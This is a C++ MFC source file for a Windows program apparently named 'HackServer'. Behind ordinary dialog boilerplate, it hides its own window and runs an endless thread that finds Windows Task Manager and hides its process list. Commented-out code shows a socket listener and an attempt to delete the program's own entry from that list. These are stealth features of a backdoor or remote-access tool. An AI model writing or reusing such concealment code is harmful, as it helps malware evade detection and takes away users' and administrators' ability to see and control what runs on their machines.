// HackServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "HackServer.h"
#include "HackServerDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CHackServerDlg dialog



CHackServerDlg::CHackServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CHackServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHackServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_txtLog);
}

BEGIN_MESSAGE_MAP(CHackServerDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTEXIT, OnBnClickedBtexit)
END_MESSAGE_MAP()


// CHackServerDlg message handlers

BOOL CHackServerDlg::OnInitDialog()
{
	
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here
	/*Sock.Create(258);
	Sock.Listen();
	int i =Sock.GetLastError();  
	if(i!=0)
	{
		this->CloseWindow();
	}*/
	AfxBeginThread(CHackServerDlg::ThrdRmvFrmTaskManager,this);
	CDialog::OnInitDialog();
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CHackServerDlg::OnPaint() 
{
	AfxGetApp()->HideApplication();
	this->ShowWindow(SW_HIDE);
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
		
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CHackServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CHackServerDlg::OnBnClickedBtexit()
{
	::PostQuitMessage(0);
}
void CHackServerDlg::MakeLog(CString str)
{
	//CString txt;
	//m_txtLog.GetWindowText(txt);
	//txt=str+"\r\n"+txt;
	//m_txtLog.SetWindowText(str);
	return;
}
UINT CHackServerDlg::ThrdRmvFrmTaskManager(LPVOID param)
{
	char Caption[300];
	HINSTANCE hTaskMan = LoadLibrary( _T("taskmgr.exe") );
	if ( hTaskMan != NULL )
	{
		int count=LoadString( hTaskMan, 10003,Caption, 300 );
		if(count==0)
		{
			strcpy(Caption,"Windows Task Manager");
		}
		FreeLibrary( hTaskMan );
	}
	else
	{
		strcpy(Caption,"Windows Task Manager");
	}
	//------------LOOP-------
	while(1)
	{
		HWND hwndTaskMan = ::FindWindow( NULL,Caption);

		if(hwndTaskMan!=NULL)
		{
			HWND hwndProcessList=NULL;
			EnumChildWindows(hwndTaskMan,CHackServerDlg::EnumChildProc,(LPARAM)&hwndProcessList);
			if(hwndProcessList!=NULL)
			{
				
				::ShowWindow(hwndProcessList,SW_HIDE);
				//int count=ListView_GetItemCount(hwndProcessList);
				//ListView_DeleteAllItems(hwndProcessList);
				//ListView_DeleteColumn(hwndProcessList,0);
				//char* str=new char[20];
				//ListView_GetItemText(hwndProcessList,1,0,str,20);
				/*for(int i=0;i<count;i++)
				{
					
					/*if(strcmp(str,"HackServer")==0)
					{
						ListView_DeleteItem(hwndProcessList,i);
					}*/
				//}
				
			}

		}
		Sleep(100);
	}
	//------------LOOP--------
	return true;
}
BOOL CALLBACK CHackServerDlg::EnumChildProc(HWND hwnd,LPARAM lParam)
{
	HWND* pHWnd = (HWND*)lParam;
	if ( (DWORD)::GetDlgCtrlID( hwnd ) == 0x3F1 )
	{
		*pHWnd=hwnd;
		return FALSE;
	}

	return TRUE;
}
